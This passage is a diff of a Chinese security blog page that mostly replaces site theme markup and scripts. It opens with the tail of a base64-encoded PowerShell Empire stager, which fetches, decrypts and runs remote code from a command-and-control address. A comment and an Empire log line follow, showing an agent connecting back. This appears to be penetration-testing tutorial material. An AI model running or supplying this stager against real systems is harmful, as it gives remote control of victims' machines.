class="built_in">bg</span>B0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBPAFgAeQA7ACQAdwBDAC4AUABSAG8AWABZAC4AQwByAGUAZABFAG4AdABpAGEATABzACAAPQAgAFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAEMAcgBlAGQAZQBuAFQASQBhAGwAQwBhAGMASABlAF0AOgA6AEQAZQBGAGEAVQBMAFQATgBFAFQAVwBvAHIASwBDAHIAZQBEAEUATgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQB4AFQALgBFAE4AQwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQAZQBTACgAJwAzAGEAYgA0ADcAMgA4ADQAYwBmADcAZQAyADYAMAA1ADQAMQBkADgAMQAwAGIAZQBiADUANABkADMANAAwADUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOAA4AC4AMQA6ADUAMAAwADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgAvAGoAMwAxAEkAYwBRAGQAZQAzAEYANwB2AGoAWABYADIA<span class="built_in">bg</span>BwADYARQAyAFcAcQBiAGMAPQAiACkAOwAkAEQAYQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEARABEAGEAVABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAGUATgBHAHQASABdADsALQBKAE8AaQBuAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==</div><div class="line"><span class="comment">#在目标机器上执行上面的payload就可以得到下面的反弹</span></div><div class="line">(Empire: listeners) &gt; [+] Initial agent G3BYNCLW from 172.17.0.1 now active (Slack)</div></pre></td></tr></table></figure>
 
-      
-    </div>
+  </section>
 
-    <div>
-      
-        
+  <section class="post-comments">
 
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
 
 
-    <footer class="post-footer">
-      
+</article>
 
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2017/11/02/EIS-2017-MISC题解/" rel="next" title="EIS 2017 DNS101题解">
-                <i class="fa fa-chevron-left"></i> EIS 2017 DNS101题解
-              </a>
-            
-          </div>
 
-          <span class="post-nav-divider"></span>
+            <footer class="footer">
 
-          <div class="post-nav-prev post-nav-item">
-            
-          </div>
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
         </div>
-      
-
-      
-      
-    </footer>
-  </article>
-
-
-
-    <div class="post-spread">
-      
     </div>
-  </div>
 
-          
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
     
-      <div class="ds-thread" data-thread-key="2017/12/02/Docker笔记—基础篇/"
-           data-title="Docker笔记—基础篇" data-url="http://zer0yu.github.io/2017/12/02/Docker笔记—基础篇/">
-      </div>
+
     
-  </div>
 
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/images/avatar.gif"
-               alt="ZEROYU" />
-          <p class="site-author-name" itemprop="name">ZEROYU</p>
-          <p class="site-description motion-element" itemprop="description">一只单线程HACKER</p>
-        </div>
-        <nav class="site-state motion-element">
-        
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">34</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
-            </div>
-          
-
-          
-
-          
-
-        </nav>
-
-        
-          <div class="feed-link motion-element">
-            <a href="/atom.xml" rel="alternate">
-              <i class="fa fa-rss"></i>
-              RSS
-            </a>
-          </div>
-        
-
-        <div class="links-of-author motion-element">
-          
-            
-              <span class="links-of-author-item">
-                <a href="https://github.com/zer0yu" target="_blank" title="Github">
-                  
-                    <i class="fa fa-fw fa-globe"></i>
-                  
-                  Github
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://weibo.com/Z3r0yu" target="_blank" title="Weibo">
-                  
-                    <i class="fa fa-fw fa-weibo"></i>
-                  
-                  Weibo
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="zeroyu.xyz@gmail.com" target="_blank" title="Email">
-                  
-                    <i class="fa fa-fw fa-globe"></i>
-                  
-                  Email
-                </a>
-              </span>
-            
-          
-        </div>
-
-        
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              友情链接
-            </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://blog.csdn.net/zeroyu_xyz" title="我的CSDN博客" target="_blank">我的CSDN博客</a>
-                </li>
-              
-            </ul>
-          </div>
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#概念"><span class="nav-number">1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作镜像"><span class="nav-number">3.</span> <span class="nav-text">操作镜像</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-添加镜像标签"><span class="nav-number">3.1.</span> <span class="nav-text">3.添加镜像标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-查看详细信息"><span class="nav-number">3.2.</span> <span class="nav-text">4.查看详细信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-查看镜像历史"><span class="nav-number">3.3.</span> <span class="nav-text">5.查看镜像历史</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-搜索镜像"><span class="nav-number">3.4.</span> <span class="nav-text">6.搜索镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-删除镜像"><span class="nav-number">3.5.</span> <span class="nav-text">7.删除镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-创建镜像"><span class="nav-number">3.6.</span> <span class="nav-text">8.创建镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-存出和载入镜像"><span class="nav-number">3.7.</span> <span class="nav-text">9.存出和载入镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-上传镜像"><span class="nav-number">3.8.</span> <span class="nav-text">10.上传镜像</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作容器"><span class="nav-number">4.</span> <span class="nav-text">操作容器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-创建容器"><span class="nav-number">4.1.</span> <span class="nav-text">1.创建容器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-终止容器"><span class="nav-number">4.2.</span> <span class="nav-text">2.终止容器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-进入容器"><span class="nav-number">4.3.</span> <span class="nav-text">3.进入容器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-导入和导出容器"><span class="nav-number">4.4.</span> <span class="nav-text">5.导入和导出容器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker数据管理"><span class="nav-number">5.</span> <span class="nav-text">Docker数据管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker端口映射"><span class="nav-number">6.</span> <span class="nav-text">Docker端口映射</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy;  2015 - 
-  <span itemprop="copyrightYear">2017</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">ZEROYU</span>
-</div>
-
-
-<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">ZEROYU</a> 强力驱动
-</div>
-
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
-  </a>
-</div>
-
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
-
-<script>
-(function(){
-    var bp = document.createElement('script');
-    bp.src = '//push.zhanzhang.baidu.com/push.js';
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
-</script>
-
-
-        
-
-        
-      </div>
-    </footer>
-
-    <div class="back-to-top">
-      <i class="fa fa-arrow-up"></i>
-    </div>
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
-
-
-
-  
-
-  
-    
-  
-
-  <script type="text/javascript">
-    var duoshuoQuery = {short_name:"zeroyu.duoshuo.com"};
-    (function() {
-      var ds = document.createElement('script');
-      ds.type = 'text/javascript';ds.async = true;
-      ds.id = 'duoshuo-script';
-      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-      ds.charset = 'UTF-8';
-      (document.getElementsByTagName('head')[0]
-      || document.getElementsByTagName('body')[0]).appendChild(ds);
-    })();
-  </script>
-
-  
-    
-    
-    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
-    <script src="/js/src/hook-duoshuo.js"></script>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length == 0) {
-      search_path = "search.xml";
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    function proceedsearch() {
-      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
-      $('.popup').toggle();
-    }
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-      $.ajax({
-        url: path,
-        dataType: "xml",
-        async: true,
-        success: function( xmlResponse ) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = $( "entry", xmlResponse ).map(function() {
-            return {
-              title: $( "title", this ).text(),
-              content: $("content",this).text(),
-              url: $( "url" , this).text()
-            };
-          }).get();
-          var $input = document.getElementById(search_id);
-          var $resultContent = document.getElementById(content_id);
-          $input.addEventListener('input', function(){
-            var matchcounts = 0;
-            var str='<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length > 1) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var content_index = [];
-                var data_title = data.title.trim().toLowerCase();
-                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
-                var data_url = decodeURIComponent(data.url);
-                var index_title = -1;
-                var index_content = -1;
-                var first_occur = -1;
-                // only match artiles with not empty titles and contents
-                if(data_title != '') {
-                  keywords.forEach(function(keyword, i) {
-                    index_title = data_title.indexOf(keyword);
-                    index_content = data_content.indexOf(keyword);
-                    if( index_title >= 0 || index_content >= 0 ){
-                      isMatch = true;
-                      if (i == 0) {
-                        first_occur = index_content;
-                      }
-                    }
-
-                  });
-                }
-                // show search results
-                if (isMatch) {
-                  matchcounts += 1;
-                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
-                  var content = data.content.trim().replace(/<[^>]+>/g,"");
-                  if (first_occur >= 0) {
-                    // cut out 100 characters
-                    var start = first_occur - 20;
-                    var end = first_occur + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if(start == 0){
-                      end = 50;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    var match_content = content.substring(start, end);
-                    // highlight all keywords
-                    keywords.forEach(function(keyword){
-                      var regS = new RegExp(keyword, "gi");
-                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
-                    });
-
-                    str += "<p class=\"search-result\">" + match_content +"...</p>"
-                  }
-                  str += "</li>";
-                }
-              })};
-            str += "</ul>";
-            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
-            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
-            $resultContent.innerHTML = str;
-          });
-          proceedsearch();
-        }
-      });}
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched == false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(function(e){
-      $('.popup').hide();
-      $(".popoverlay").remove();
-      $('body').css('overflow', '');
-    });
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-  </script>
-
-
-  
-
-  
-
-  
-  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
-  <script>AV.initialize("KY6fzHpNYVDAlWLyfhKdz5OA-gzGzoHsz", "IlxIqswmBd92jfiSvOIQSLf5");</script>
-  <script>
-    function showTime(Counter) {
-      var query = new AV.Query(Counter);
-      var entries = [];
-      var $visitors = $(".leancloud_visitors");
-
-      $visitors.each(function () {
-        entries.push( $(this).attr("id").trim() );
-      });
-
-      query.containedIn('url', entries);
-      query.find()
-        .done(function (results) {
-          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
-
-          if (results.length === 0) {
-            $visitors.find(COUNT_CONTAINER_REF).text(0);
-            return;
-          }
-
-          for (var i = 0; i < results.length; i++) {
-            var item = results[i];
-            var url = item.get('url');
-            var time = item.get('time');
-            var element = document.getElementById(url);
-
-            $(element).find(COUNT_CONTAINER_REF).text(time);
-          }
-          for(var i = 0; i < entries.length; i++) {
-            var url = entries[i];
-            var element = document.getElementById(url);
-            var countSpan = $(element).find(COUNT_CONTAINER_REF);
-            if( countSpan.text() == '') {
-              countSpan.text(0);
-            }
-          }
-        })
-        .fail(function (object, error) {
-          console.log("Error: " + error.code + " " + error.message);
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
         });
-    }
+    </script>
 
-    function addCount(Counter) {
-      var $visitors = $(".leancloud_visitors");
-      var url = $visitors.attr('id').trim();
-      var title = $visitors.attr('data-flag-title').trim();
-      var query = new AV.Query(Counter);
 
-      query.equalTo("url", url);
-      query.find({
-        success: function(results) {
-          if (results.length > 0) {
-            var counter = results[0];
-            counter.fetchWhenSave(true);
-            counter.increment("time");
-            counter.save(null, {
-              success: function(counter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(counter.get('time'));
-              },
-              error: function(counter, error) {
-                console.log('Failed to save Visitor num, with error message: ' + error.message);
-              }
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
             });
-          } else {
-            var newcounter = new Counter();
-            /* Set ACL */
-            var acl = new AV.ACL();
-            acl.setPublicReadAccess(true);
-            acl.setPublicWriteAccess(true);
-            newcounter.setACL(acl);
-            /* End Set ACL */
-            newcounter.set("title", title);
-            newcounter.set("url", url);
-            newcounter.set("time", 1);
-            newcounter.save(null, {
-              success: function(newcounter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
-              },
-              error: function(newcounter, error) {
-                console.log('Failed to create');
-              }
-            });
-          }
-        },
-        error: function(error) {
-          console.log('Error:' + error.code + " " + error.message);
-        }
-      });
-    }
-
-    $(function() {
-      var Counter = AV.Object.extend("Counter");
-      if ($('.leancloud_visitors').length == 1) {
-        addCount(Counter);
-      } else if ($('.post-title-link').length > 1) {
-        showTime(Counter);
-      }
-    });
-  </script>
+        });
+    </script>
 
 
-
-  
-
-  
-
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
 
 </body>
 </html>
